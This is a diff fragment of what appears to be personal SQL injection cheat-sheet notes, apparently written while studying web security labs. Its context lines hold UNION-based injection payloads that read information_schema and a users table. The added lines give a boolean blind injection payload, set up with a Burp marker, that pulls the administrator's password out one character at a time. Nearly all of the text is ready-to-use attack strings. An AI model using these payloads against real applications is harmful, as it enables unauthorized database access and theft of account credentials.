@@ -12,6 +12,9 @@ PARAM VALUE' union select 1,2,3 from information_schema.columns where table_sche
 
 PARAM VALUE' union select 1,2,3 from users where username like 'a% Will help get values from table and columns)
 
+Simple Blind Query to pull administrator password. Substring is comparing password and pulling out the 7th character and starting at posistion 1.
+' AND (SELECT SUBSTRING(password,7,1) FROM users WHERE username='administrator')='$Burp Marker$;
+
 ## Blind SQLi (Time) ##
 
 Change param in url.
